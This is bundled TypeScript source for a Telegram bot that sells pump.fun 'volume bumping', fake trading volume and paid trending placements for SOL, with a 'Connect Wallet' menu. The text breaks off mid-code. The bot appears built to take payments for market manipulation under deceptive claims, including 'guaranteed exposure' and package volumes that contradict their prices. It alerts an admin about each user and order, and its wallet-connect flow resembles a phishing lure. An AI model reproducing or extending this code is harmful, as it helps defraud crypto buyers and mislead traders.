// src/app.ts
import express from "express";
import cookieParser from "cookie-parser";
import cors from "cors";
var app = express();
app.use(cors());
app.use(express.json());
app.use(cookieParser());
app.get("/health", (_req, res) => {
  res.json({ status: "ok", ts: Date.now() });
});
app.get("/", (_req, res) => {
  res.json({ name: "Cherry Bot", status: "running" });
});
var app_default = app;

// src/lib/logger.ts
import pino from "pino";
var logger = pino({
  level: process.env.LOG_LEVEL ?? "info",
  ...process.env.NODE_ENV !== "production" ? { transport: { target: "pino-pretty", options: { colorize: true } } } : {}
});

// src/bot/index.ts
import path from "path";
import { fileURLToPath } from "url";
import { randomUUID } from "crypto";
import { Telegraf } from "telegraf";

// src/bot/admin.ts
var botRef = null;
function setBot(bot) {
  botRef = bot;
}
async function notifyAdmin(message) {
  const adminId = process.env.ADMIN_TELEGRAM_ID;
  if (!adminId || !botRef) return;
  try {
    await botRef.telegram.sendMessage(adminId, message, { parse_mode: "HTML" });
  } catch (err) {
    logger.warn({ err }, "Failed to notify admin");
  }
}

// src/bot/sessions.ts
var sessions = /* @__PURE__ */ new Map();
function getSession(userId) {
  if (!sessions.has(userId)) sessions.set(userId, {});
  return sessions.get(userId);
}
function setSession(userId, data) {
  sessions.set(userId, { ...getSession(userId), ...data });
}
function clearSession(userId) {
  sessions.set(userId, {});
}

// src/bot/wallet.ts
import * as bip39 from "bip39";
import { derivePath } from "ed25519-hd-key";
import nacl from "tweetnacl";
import bs58 from "bs58";
function deriveWalletForUser(userId) {
  const masterSeed = process.env.MASTER_SEED;
  if (!masterSeed) {
    logger.warn("MASTER_SEED not set \u2014 returning placeholder wallet");
    return { address: "WALLET_NOT_CONFIGURED", privateKey: "" };
  }
  try {
    const seed = bip39.mnemonicToSeedSync(masterSeed);
    const path2 = `m/44'/501'/${userId}'/0'`;
    const derived = derivePath(path2, seed.toString("hex"));
    const keypair = nacl.sign.keyPair.fromSeed(derived.key);
    const address = bs58.encode(keypair.publicKey);
    const privateKey = bs58.encode(keypair.secretKey);
    return { address, privateKey };
  } catch (err) {
    logger.error({ err }, "Failed to derive wallet for user");
    return { address: "WALLET_ERROR", privateKey: "" };
  }
}

// src/bot/tokenInfo.ts
function fmt(n) {
  if (n >= 1e9) return `${(n / 1e9).toFixed(2)}B`;
  if (n >= 1e6) return `${(n / 1e6).toFixed(2)}M`;
  if (n >= 1e3) return `${(n / 1e3).toFixed(2)}K`;
  return n.toFixed(2);
}
async function fetchTokenInfo(ca) {
  try {
    const resp = await fetch(
      `https://api.dexscreener.com/latest/dex/tokens/${ca}`,
      { headers: { "User-Agent": "Mozilla/5.0" } }
    );
    if (resp.ok) {
      const data = await resp.json();
      if (data.pairs && data.pairs.length > 0) {
        const pair = data.pairs[0];
        return {
          name: pair.baseToken?.name ?? "Unknown",
          symbol: pair.baseToken?.symbol ?? "???",
          price: pair.priceUsd ? `$${Number(pair.priceUsd).toFixed(8)}` : "N/A",
          marketCap: pair.fdv ? `$${fmt(pair.fdv)}` : "N/A",
          liquidity: pair.liquidity?.usd ? `$${fmt(pair.liquidity.usd)}` : "N/A",
          volume24h: pair.volume?.h24 ? `$${fmt(pair.volume.h24)}` : "N/A",
          change24h: pair.priceChange?.h24 ? `${Number(pair.priceChange.h24).toFixed(2)}` : "0.00",
          dex: pair.dexId ?? "pumpfun",
          imageUrl: pair.info?.imageUrl ?? pair.baseToken?.logoURI
        };
      }
    }
  } catch (err) {
    logger.debug({ err }, "DexScreener fetch failed");
  }
  try {
    const resp = await fetch(
      `https://frontend-api.pump.fun/coins/${ca}`,
      { headers: { "User-Agent": "Mozilla/5.0" } }
    );
    if (resp.ok) {
      const data = await resp.json();
      return {
        name: data.name ?? "Unknown",
        symbol: data.symbol ?? "???",
        price: "N/A",
        marketCap: data.usd_market_cap ? `$${fmt(data.usd_market_cap)}` : "N/A",
        liquidity: "N/A",
        volume24h: "N/A",
        change24h: "0.00",
        dex: "pumpfun",
        imageUrl: data.image_uri
      };
    }
  } catch (err) {
    logger.debug({ err }, "Pump.fun fetch failed");
  }
  return null;
}

// src/bot/keyboards.ts
import { Markup } from "telegraf";
var mainMenuKeyboard = Markup.keyboard([
  ["\u{1F7E2} Start Bumping"],
  ["\u{1F4CA} Volume Boost", "\u{1F525} Trending Boost"],
  ["\u{1F310} DexScreener", "\u{1F4B0} Deposit"],
  ["\u{1F517} Connect Wallet"],
  ["\u{1F4AC} Contact Support"]
]).resize();
var solPickerKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F535} 0.3 SOL", "sol_0.3"),
    Markup.button.callback("\u{1F7E1} 0.4 SOL", "sol_0.4")
  ],
  [
    Markup.button.callback("\u{1F7E0} 0.5 SOL", "sol_0.5"),
    Markup.button.callback("\u{1F534} 0.6 SOL", "sol_0.6")
  ],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var confirmOrderKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2705 Confirm Order", "confirm_bump")],
  [Markup.button.callback("\u274C Cancel", "back_main")]
]);
var paymentSentKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u2705 Payment Sent", "submit_tx")],
  [Markup.button.callback("\u274C Cancel Order", "back_main")]
]);
var cancelKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u274C Cancel", "back_main")]
]);
var volumeBoostKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("1.50 SOL - Iron", "vol_iron"),
    Markup.button.callback("2.50 SOL - Bronze", "vol_bronze")
  ],
  [
    Markup.button.callback("3.50 SOL - Gold", "vol_gold"),
    Markup.button.callback("7.50 SOL - Platinum", "vol_platinum")
  ],
  [
    Markup.button.callback("5.00 SOL - Silver", "vol_silver"),
    Markup.button.callback("10.50 SOL - Diamond", "vol_diamond")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var trendingMenuKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("SOL TRENDING", "trend_sol")],
  [
    Markup.button.callback("ETH TRENDING", "trend_eth"),
    Markup.button.callback("PUMPFUN TRENDING", "trend_pumpfun")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var solTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u{1F534} TOP 3 \u{1F534}", "st_top3_label"),
    Markup.button.callback("\u{1F534} TOP 10 \u{1F534}", "st_top10_label")
  ],
  [
    Markup.button.callback("\u23F3 3 hr | 1.50 SOL", "st_top3_3hr"),
    Markup.button.callback("\u23F3 3 hr | 1.00 SOL", "st_top10_3hr")
  ],
  [
    Markup.button.callback("\u23F3 6 hr | 2.30 SOL", "st_top3_6hr"),
    Markup.button.callback("\u23F3 6 hr | 1.60 SOL", "st_top10_6hr")
  ],
  [
    Markup.button.callback("\u23F3 12 hr | 3.70 SOL", "st_top3_12hr"),
    Markup.button.callback("\u23F3 12 hr | 2.60 SOL", "st_top10_12hr")
  ],
  [
    Markup.button.callback("\u23F3 24 hr | 5.90 SOL", "st_top3_24hr"),
    Markup.button.callback("\u23F3 24 hr | 4.10 SOL", "st_top10_24hr")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var ethTrendingKeyboard = Markup.inlineKeyboard([
  [
    Markup.button.callback("\u23F3 100$", "et_100"),
    Markup.button.callback("\u23F3 200$", "et_200")
  ],
  [Markup.button.callback("\u23F3 300$", "et_300")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var pumpfunTrendingKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F525} P.F.T - 30 SOL", "pft_30")],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "trend_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var dexscreenerKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F534} TOP 6 \u{1F534}", "dex_top6_info")],
  [
    Markup.button.callback("\u23F3 5 hr | 2 SOL", "dex_5hr"),
    Markup.button.callback("\u23F3 7 hr | 3.5 SOL", "dex_7hr")
  ],
  [
    Markup.button.callback("\u23F3 12 hr | 7 SOL", "dex_12hr"),
    Markup.button.callback("\u23F3 24 hr | 15 SOL", "dex_24hr")
  ],
  [
    Markup.button.callback("\u23F3 18 hr | 10 SOL", "dex_18hr"),
    Markup.button.callback("\u23F3 32 hr | 22 SOL", "dex_32hr")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var depositKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("ADD", "deposit_add")],
  [
    Markup.button.callback("WITHDRAW", "deposit_withdraw"),
    Markup.button.callback("SOL BALANCE", "deposit_sol_balance")
  ],
  [
    Markup.button.callback("\u{1F4CB} My Deposits", "deposit_my_deposits"),
    Markup.button.callback("\u{1F4CB} My Withdrawals", "deposit_my_withdrawals")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var connectWalletKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
  [Markup.button.callback("\u{1F6E1} Security Guidelines", "wallet_security")],
  [Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")],
  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
]);
var securityGuidelinesKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} I Understand, Connect Now", "wallet_connect_now")],
  [
    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
    Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
  ],
  [
    Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
  ]
]);
var howToConnectKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F517} Start Connection", "wallet_connect_now")],
  [
    Markup.button.callback("\u{1F510} Why Connect?", "wallet_why"),
    Markup.button.callback("\u{1F6E1} Security Guide...", "wallet_security")
  ]
]);
var mainMenuOnlyKeyboard = Markup.inlineKeyboard([
  [Markup.button.callback("\u{1F3E0} Main Menu", "back_main")]
]);

// src/bot/index.ts
var __filename = fileURLToPath(import.meta.url);
var __dirname = path.dirname(__filename);
var IMG = {
  welcome: path.join(__dirname, "images", "welcome.jpeg"),
  walletconnect: path.join(__dirname, "images", "walletconnect.jpeg"),
  volume: path.join(__dirname, "images", "volume.jpeg"),
  trending: path.join(__dirname, "images", "trending.jpeg")
};
var SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";
var ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";
var VOLUME_PACKAGES = {
  vol_iron: { label: "Iron", sol: 1.5, volume: "$50,000", service: "Iron Package" },
  vol_bronze: { label: "Bronze", sol: 2.5, volume: "$250,000", service: "Bronze Package" },
  vol_silver: { label: "Silver", sol: 5, volume: "$100,000,000", service: "Silver Package" },
  vol_gold: { label: "Gold", sol: 3.5, volume: "$100,000", service: "Gold Package" },
  vol_platinum: { label: "Platinum", sol: 7.5, volume: "$500,000", service: "Platinum Package" },
  vol_diamond: { label: "Diamond", sol: 10.5, volume: "$2,500,000", service: "Diamond Package" }
};
var SOL_TREND_PACKAGES = {
  st_top3_3hr: { label: "TOP 3 \u2014 3 hr", sol: 1.5, service: "SOL Trending TOP 3 3hr" },
  st_top3_6hr: { label: "TOP 3 \u2014 6 hr", sol: 2.3, service: "SOL Trending TOP 3 6hr" },
  st_top3_12hr: { label: "TOP 3 \u2014 12 hr", sol: 3.7, service: "SOL Trending TOP 3 12hr" },
  st_top3_24hr: { label: "TOP 3 \u2014 24 hr", sol: 5.9, service: "SOL Trending TOP 3 24hr" },
  st_top10_3hr: { label: "TOP 10 \u2014 3 hr", sol: 1, service: "SOL Trending TOP 10 3hr" },
  st_top10_6hr: { label: "TOP 10 \u2014 6 hr", sol: 1.6, service: "SOL Trending TOP 10 6hr" },
  st_top10_12hr: { label: "TOP 10 \u2014 12 hr", sol: 2.6, service: "SOL Trending TOP 10 12hr" },
  st_top10_24hr: { label: "TOP 10 \u2014 24 hr", sol: 4.1, service: "SOL Trending TOP 10 24hr" }
};
var ETH_TREND_PACKAGES = {
  et_100: { usd: 100, service: "ETH Trending $100" },
  et_200: { usd: 200, service: "ETH Trending $200" },
  et_300: { usd: 300, service: "ETH Trending $300" }
};
var DEX_PACKAGES = {
  dex_5hr: { label: "TOP 6 \u2014 5 hr", sol: 2, service: "DexScreener TOP6 5hr" },
  dex_7hr: { label: "TOP 6 \u2014 7 hr", sol: 3.5, service: "DexScreener TOP6 7hr" },
  dex_12hr: { label: "TOP 6 \u2014 12 hr", sol: 7, service: "DexScreener TOP6 12hr" },
  dex_18hr: { label: "TOP 6 \u2014 18 hr", sol: 10, service: "DexScreener TOP6 18hr" },
  dex_24hr: { label: "TOP 6 \u2014 24 hr", sol: 15, service: "DexScreener TOP6 24hr" },
  dex_32hr: { label: "TOP 6 \u2014 32 hr", sol: 22, service: "DexScreener TOP6 32hr" }
};
async function sendPhoto(ctx, imgPath, caption, extra = {}) {
  try {
    await ctx.replyWithPhoto({ source: imgPath }, { caption, parse_mode: "HTML", ...extra });
  } catch {
    await ctx.reply(caption, { parse_mode: "HTML", ...extra });
  }
}
function buildTokenMsg(ca, info, s) {
  const sol = s.selectedSol ?? 0;
  const eth = s.ethAmount ?? null;
  const cost = eth ? `$${eth} USD` : `${sol} SOL`;
  return `\u{1F4CB} <b>Project Details Found!</b>

\u2705 <b>Contract Address:</b>
<code>${ca}</code>

\u{1F4CA} <b>Token Information:</b>
\u2022 Name: ${info.name ?? "Unknown"}
\u2022 Symbol: ${info.symbol ?? "???"}
\u2022 Price: ${info.price ?? "N/A"}
\u2022 Market Cap: ${info.marketCap ?? "N/A"}
\u2022 24h Volume: ${info.volume24h ?? "N/A"}
\u2022 Liquidity: ${info.liquidity ?? "N/A"}
\u2022 24h Change: ${info.change24h ?? "0.00"}%
\u2022 DEX: ${info.dex ?? "pumpfun"}
\u2022 Chain: Solana

\u{1F517} Available on: \u{1F7E2} Pumpswap \u2022 \u{1F7E2} Pump.fun

\u2699\uFE0F <b>Service:</b> ${s.serviceLabel ?? "Volume Bumping"}
\u{1F4B0} <b>Cost:</b> ${cost}

\u{1F517} View: https://pump.fun/coin/${ca}

Confirm to proceed with payment.`;
}
async function sendWelcome(ctx) {
  const caption = `\u{1F7E2} <b>Welcome to PUMPFUN TREND BOT service!</b>

New to volume bots? No worries \u2014 we made it super simple!

\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

<b>How it works:</b>
1. Select how much Bumps/volume to use.
2. Pick how long to run and how massive you want your Token to pump.
3. Done! Pump.fun Server handles the rest.

\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500

<b>Works on:</b>
\u{1F7E2} Pumpfun \u2022 \u{1F7E2} Raydium \u2022 \u{1F7E2} PumpSwap
\u{1F7E2} Moonshot \u2022 \u{1F7E2} LetsBonk \u2022 \u{1F7E2} Dexscreener

From 0.3\u20130.6 SOL bumps, boost trend with mass volume and high stability.`;
  await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
}
async function showStartBumping(ctx) {
  await ctx.reply(
    `<b>\u{1F7E2} Start Bumping</b>

The fastest and cheapest Telegram bot for creating bump orders.

<b>Supported Platforms:</b>
\u2022 Pumpfun and Raydium

Pumpfun BumpBot charges a one-time fee per token \u2014 the cheapest bump bot ever!

\u{1F4CA} <b>Trending channel:</b> https://t.me/pumpmints

Subscribe to PF alert tools:
\u2022 PF New Raydium Pools: t.me/pumpswap_pools

For support, contact @mrpooh

<b>Select your SOL amount:</b>`,
    { parse_mode: "HTML", ...solPickerKeyboard }
  );
}
async function showVolumeBoost(ctx) {
  const caption = `\u{1F4CA} <b>Volume Boost Packages</b>

\u{1F9EA} Iron Package     \u2014 $50,000 Volume    \u2014 1.50 SOL
\u{1F9EA} Bronze Package   \u2014 $250,000 Volume   \u2014 2.50 SOL
\u{1F9EA} Gold Package     \u2014 $100,000 Volume   \u2014 3.50 SOL
\u{1F9EA} Silver Package   \u2014 $100M Volume      \u2014 5.00 SOL
\u{1F9EA} Platinum Package \u2014 $500,000 Volume   \u2014 7.50 SOL
\u{1F9EA} Diamond Package  \u2014 $2,500,000 Volume \u2014 10.50 SOL

Please select the package below:`;
  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
}
async function showTrendingBoost(ctx) {
  const caption = `\u{1F7E2} <b>Discover the Power of Trending!</b>

Ready to boost your project's visibility?

\u2705 Guaranteed exposure
\u2705 Milestone & uptrend alerts
\u2705 Paid boost = spot in daily livestream (AMA)!

\u27A1\uFE0F Choose your trending type below:`;
  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
}
async function showDexScreener(ctx) {
  await ctx.reply(
    `\u{1F310} <b>DexScreener Trending</b>

DexScreener is the #1 on-chain analytics platform for DEXs \u2014 real-time token prices, liquidity, volumes and market trends across all chains.

<b>\u{1F534} TOP 6 Trending Packages:</b>

\u23F3 5 hr  \u2014 2 SOL
\u23F3 7 hr  \u2014 3.5 SOL
\u23F3 12 hr \u2014 7 SOL
\u23F3 18 hr \u2014 10 SOL
\u23F3 24 hr \u2014 15 SOL
\u23F3 32 hr \u2014 22 SOL

Select a duration below:`,
    { parse_mode: "HTML", ...dexscreenerKeyboard }
  );
}
async function showDeposit(ctx) {
  const wallet = deriveWalletForUser(ctx.from.id);
  await ctx.reply(
    `<b>\u{1F4B0} WALLET BALANCE</b>

<b>SOL:</b>
<code>${wallet.address}</code>
balance: checking...

<b>ETH:</b>
<code>${ETH_ADDRESS || "Not configured"}</code>
balance: 0 ETH

Deposit minimum <b>0.30 SOL</b> to get trending across multiple platforms.

\u{1F4A1} Click <b>ADD</b> to generate your unique deposit wallet.
\u{1F512} All funds are secured by HD wallet derivation.`,
    { parse_mode: "HTML", ...depositKeyboard }
  );
}
async function showConnectWallet(ctx) {
  const caption = `\u{1F517} <b>Connect Your Wallet</b>

Welcome to our secure wallet connection service!

Connect your wallet to unlock premium features and enhanced trading capabilities.

<b>Available Options:</b>
\u{1F517} Connect Now \u2014 Start the connection process
\u{1F510} Why Connect? \u2014 Learn about the benefits
\u{1F6E1} Security Guidelines \u2014 Important safety information
\u{1F4F1} How to Connect \u2014 Step-by-step instructions

Your security is our top priority. We use industry-standard encryption.`;
  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
}
async function showSupport(ctx) {
  await ctx.reply(
    `\u{1F4AC} <b>Contact Support</b>

For assistance, contact: @mrpooh

\u{1F4CA} Trending channel: https://t.me/pumpmints

\u{1F514} PF Alert Tools: t.me/pumpswap_pools

Your User ID: <code>${ctx.from.id}</code>

\u23F0 Support hours: 24/7`,
    { parse_mode: "HTML", ...mainMenuKeyboard }
  );
}
function createBot() {
  const token2 = process.env.TELEGRAM_BOT_TOKEN;
  if (!token2) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const bot = new Telegraf(token2);
  setBot(bot);
  bot.catch((err, ctx) => {
    const msg = err instanceof Error ? err.message : String(err);
    logger.error({ err, updateType: ctx?.updateType }, `Unhandled bot error: ${msg}`);
    ctx?.reply?.("\u26A0\uFE0F Something went wrong. Please try again or use /start.").catch(() => {
    });
  });
  bot.start(async (ctx) => {
    const u = ctx.from;
    clearSession(u.id);
    await notifyAdmin(
      `\u{1F195} <b>New User Started Bot</b>
\u{1F464} Name: ${u.first_name}${u.last_name ? " " + u.last_name : ""}
\u{1F516} Username: ${u.username ? "@" + u.username : "N/A"}
\u{1F194} User ID: <code>${u.id}</code>
\u23F0 Time: ${(/* @__PURE__ */ new Date()).toUTCString()}`
    );
    await sendWelcome(ctx);
  });
  bot.hears("\u{1F7E2} Start Bumping", (ctx) => showStartBumping(ctx));
  bot.hears("\u{1F4CA} Volume Boost", (ctx) => showVolumeBoost(ctx));
  bot.hears("\u{1F525} Trending Boost", (ctx) => showTrendingBoost(ctx));
  bot.hears("\u{1F310} DexScreener", (ctx) => showDexScreener(ctx));
  bot.hears("\u{1F4B0} Deposit", (ctx) => showDeposit(ctx));
  bot.hears("\u{1F517} Connect Wallet", (ctx) => showConnectWallet(ctx));
  bot.hears("\u{1F4AC} Contact Support", (ctx) => showSupport(ctx));
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await sendWelcome(ctx);
  });
  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: parseFloat(amt),
        serviceLabel: `Volume Bumping (${amt} SOL)`,
        boostType: "bump"
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected <b>${amt} SOL</b> per bump.

Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  for (const [key, pkg] of Object.entries(VOLUME_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "volume",
        boostPackage: key
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected: <b>${pkg.label} Package</b>
\u{1F4B0} Cost: <b>${pkg.sol} SOL</b>
\u{1F4CA} Volume: <b>${pkg.volume}</b>

Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u2600\uFE0F <b>SOL Trending</b>

Choose your package \u2014 TOP 3 (left) or TOP 10 (right):`,
      { parse_mode: "HTML", ...solTrendingKeyboard }
    );
  });
  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `\u{1F535} <b>ETH Trending</b>

Choose your ETH trending package:`,
      { parse_mode: "HTML", ...ethTrendingKeyboard }
    );
  });
  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    const caption = `\u{1F525} <b>PUMP.FUN TRENDING</b> \u{1F525}

The best trending in the bot section!

\u{1F4A1} Don't miss the opportunity to get <b>12 hours FREE Solana Trending</b> once you purchase!

Select your package:`;
    await sendPhoto(ctx, IMG.trending, caption, pumpfunTrendingKeyboard);
  });
  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });
  bot.action("st_top3_label", async (ctx) => ctx.answerCbQuery("TOP 3 \u2014 left column"));
  bot.action("st_top10_label", async (ctx) => ctx.answerCbQuery("TOP 10 \u2014 right column"));
  for (const [key, pkg] of Object.entries(SOL_TREND_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "sol_trending",
        boostPackage: key
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected: <b>${pkg.label}</b>
\u{1F4B0} Cost: <b>${pkg.sol} SOL</b>

Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  for (const [key, pkg] of Object.entries(ETH_TREND_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: 0,
        ethAmount: pkg.usd,
        serviceLabel: pkg.service,
        boostType: "eth_trending",
        boostPackage: key
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected: <b>ETH Trending $${pkg.usd}</b>

Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, {
      step: "awaiting_ca",
      selectedSol: 30,
      serviceLabel: "PumpFun Trending P.F.T",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30"
    });
    await ctx.reply(
      `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected: <b>P.F.T \u2014 30 SOL</b>

Please enter the Contract Address (CA) of your token:`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));
  for (const [key, pkg] of Object.entries(DEX_PACKAGES)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "dexscreener",
        boostPackage: key
      });
      await ctx.reply(
        `\u{1F4DD} <b>Enter Contract Address (CA)</b>

You selected: <b>${pkg.label}</b>
\u{1F4B0} Cost: <b>${pkg.sol} SOL</b>

Please enter the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    const wallet = deriveWalletForUser(ctx.from.id);
    const orderId = randomUUID().split("-")[0].toUpperCase();
    const isEth = s.boostType === "eth_trending";
    setSession(ctx.from.id, {
      step: "awaiting_payment_sent",
      paymentWallet: isEth ? ETH_ADDRESS : wallet.address,
      orderId
    });
    const paymentBlock = isEth ? `<b>Ethereum Wallet:</b>
<code>${ETH_ADDRESS || SOL_ADDRESS}</code>

\u{1F4B5} Amount: <b>$${s.ethAmount} USD (ETH)</b>` : `<b>Solana Wallet:</b>
<code>${wallet.address}</code>

\u25CE Amount: <b>${s.selectedSol} SOL</b>`;
    await ctx.reply(
      `\u{1F4B0} <b>Payment Required</b>

\u{1F4CB} <b>Order Summary:</b>
\u2022 Token: ${s.tokenName ?? "Unknown"} (${s.tokenSymbol ?? "N/A"})
\u2022 CA: <code>${s.contractAddress ?? "N/A"}</code>
\u2022 Service: ${s.serviceLabel ?? "Boost"}
\u2022 Order ID: <code>${orderId}</code>

\u{1F4B3} <b>Send Payment To:</b>
${paymentBlock}

\u26A0\uFE0F <b>Important:</b>
\u2022 Send the EXACT amount shown
\u2022 Use the correct network
\u2022 Payment expires in 15 minutes
\u2022 After sending, click <b>\u2705 Payment Sent</b> and submit your TX hash`,
      { parse_mode: "HTML", ...paymentSentKeyboard }
    );
    await notifyAdmin(
      `\u{1F4CB} <b>New Order Created</b>
\u{1F464} User: ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
\u{1F194} User ID: <code>${ctx.from.id}</code>
\u{1FA99} Token: ${s.tokenName} (${s.tokenSymbol})
\u{1F4DC} CA: <code>${s.contractAddress}</code>
\u2699\uFE0F Service: ${s.serviceLabel}
\u{1F4B0} Amount: ${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}
\u{1F194} Order ID: <code>${orderId}</code>
\u{1F4EE} Pay to: <code>${isEth ? ETH_ADDRESS : wallet.address}</code>`
    );
  });
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    setSession(ctx.from.id, { step: "awaiting_tx_hash" });
    await ctx.reply(
      `\u{1F4DD} <b>Submit Transaction Hash</b>

Please paste your transaction hash below:

\u{1F4A1} <b>Where to find it:</b>
\u2022 Copy from your wallet app after sending
\u2022 Check your wallet's transaction history
\u2022 Look for the long string of letters and numbers

\u{1F516} Order ID: <code>${s.orderId ?? "N/A"}</code>`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery();
    const wallet = deriveWalletForUser(ctx.from.id);
    await ctx.reply(
      `\u2795 <b>Add Funds</b>

Your personal deposit addresses:

<b>\u25CE SOL Wallet:</b>
<code>${wallet.address}</code>

<b>\u039E ETH Wallet:</b>
<code>${ETH_ADDRESS || "Not configured"}</code>

\u{1F4CC} Minimum deposit: <b>0.30 SOL</b>

\u26A1 Funds are credited automatically after confirmation.`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });
  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await ctx.reply(
      `\u{1F4B8} <b>Withdraw Funds</b>

Please send your withdrawal address and amount:

<b>Format:</b> <code>ADDRESS AMOUNT</code>
<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>

\u26A0\uFE0F Double-check your address \u2014 withdrawals cannot be reversed.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });
  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery("Checking balance...");
    const wallet = deriveWalletForUser(ctx.from.id);
    let balance = "0.0000 SOL";
    try {
      const resp = await fetch("https://api.mainnet-beta.solana.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
